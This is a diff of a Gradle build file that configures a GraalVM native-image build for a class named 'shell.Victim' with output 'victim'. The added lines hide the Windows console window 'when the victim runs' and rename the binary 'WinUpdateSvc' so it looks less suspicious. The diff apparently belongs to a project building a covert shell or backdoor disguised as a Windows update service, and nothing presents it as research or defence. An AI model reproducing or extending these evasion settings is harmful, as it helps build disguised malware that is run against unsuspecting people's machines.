@@ -61,10 +61,14 @@ graalvmNative {
             mainClass = 'shell.Victim'
             imageName = 'victim'
 
-            // This tells the Windows linker to include the C-runtime statically
+            // Static linking for C-runtime
             buildArgs.add('-H:+StaticExecutableWithDynamicLibC')
-            // Or try this more aggressive one if the above doesn't work:
-            buildArgs.add('--native-image-info')
+
+            // Hides the black CMD window when the victim runs
+            buildArgs.add('-H:Win32SubSystem=windows')
+
+            // Renames internal binary strings to look less suspicious
+            buildArgs.add('-H:Name=WinUpdateSvc')
         }
     }
 }
